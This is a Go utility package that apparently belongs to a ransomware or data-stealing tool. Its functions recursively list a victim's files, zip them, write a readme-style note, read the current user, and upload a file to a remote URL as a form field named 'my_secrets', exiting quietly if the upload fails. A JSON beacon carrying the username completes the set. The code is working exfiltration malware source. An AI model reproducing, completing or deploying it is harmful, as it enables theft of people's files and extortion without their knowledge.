package utils

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"time"
)

func CreateTmpFolder(path string) {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0777)
	}
}

func FileCopy(src, dst string) (int64, error) {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		// fmt.Println(err)
		return 0, err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return 0, fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if err != nil {
		// fmt.Println(err)
		return 0, err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		// fmt.Println(err)
		return 0, err
	}
	defer destination.Close()
	nBytes, err := io.Copy(destination, source)
	// fmt.Println(err)
	return nBytes, err
}

func ListDirRecursively(root string) []string {
	var files []string

	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() == false && info.Name() != ".DS_Store" {
			files = append(files, path)
		}
		return nil
	})
	if err != nil {
		panic(err)
	}
	return files
}

func GetFileNameFromPath(path string, is_win bool) string {
	separator := "/"
	if is_win {
		separator = "\\"
	}
	s := strings.Split(path, separator)
	return s[len(s)-1]
}

func GetCurrentUser() (*user.User, error) {
	usr, err := user.Current()
	if err != nil {
		return nil, err
	}
	return usr, err
}

func ZipFiles(files_to_zip []string, out_file_path string, is_win bool) {
	// Get a Buffer to Write To
	outFile, err := os.Create(out_file_path)
	if err != nil {
		return
	}
	defer outFile.Close()

	// Create a new zip archive.
	w := zip.NewWriter(outFile)
	defer w.Close()

	for _, file_path := range files_to_zip {
		// read file data
		data, err := ioutil.ReadFile(file_path)
		if err != nil {
			continue
		}

		// Add some files to the archive.
		filename := GetFileNameFromPath(file_path, is_win)
		f, err := w.Create(filename)
		if err != nil {
			continue
		}
		_, err = f.Write(data)
		if err != nil {
			continue
		}
	}
}

func GenerateRandomString(n int) string {
	rand.Seed(time.Now().UnixNano())

	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func CreateReadme(readme_file string, content string) {
	f, err := os.Create(readme_file)
	if err != nil {
		return
	}
	defer f.Close()

	f.WriteString(content)
}

func SendFiles(url string, file_to_send string) {
	file, err := os.Open(file_to_send)
	if err != nil {
		panic(err)
	}

	//prepare the reader instances to encode
	values := map[string]io.Reader{
		"my_secrets": file,
	}
	err = Upload(url, values)
	if err != nil {
		// fmt.Println("Could not connect to server")
		os.Exit(0)
		// panic(err)
	}
}

func Upload(url string, values map[string]io.Reader) (err error) {
	// Prepare a form that you will submit to that URL.
	var b bytes.Buffer
	w := multipart.NewWriter(&b)
	for key, r := range values {
		var fw io.Writer
		if x, ok := r.(io.Closer); ok {
			defer x.Close()
		}
		// Add an image file
		if x, ok := r.(*os.File); ok {
			if fw, err = w.CreateFormFile(key, x.Name()); err != nil {
				return
			}
		} else {
			// Add other fields
			if fw, err = w.CreateFormField(key); err != nil {
				return
			}
		}
		if _, err = io.Copy(fw, r); err != nil {
			return err
		}

	}
	// Don't forget to close the multipart writer.
	// If you don't close it, your request will be missing the terminating boundary.
	w.Close()

	// Now that you have a form, you can submit it to your handler.
	req, err := http.NewRequest("POST", url, &b)
	if err != nil {
		return
	}
	// Don't forget to set the content type, this will contain the boundary.
	req.Header.Set("Content-Type", w.FormDataContentType())

	// Submit the request
	client := &http.Client{}
	res, err := client.Do(req)
	if err != nil {
		return
	}

	// Check the response
	if res.StatusCode != http.StatusOK {
		err = fmt.Errorf("bad status: %s", res.Status)
	}
	return
}

func PostJson(url string, json_string string, username string) {
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(json_string)))
	req.Header.Set("Username", username)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
}
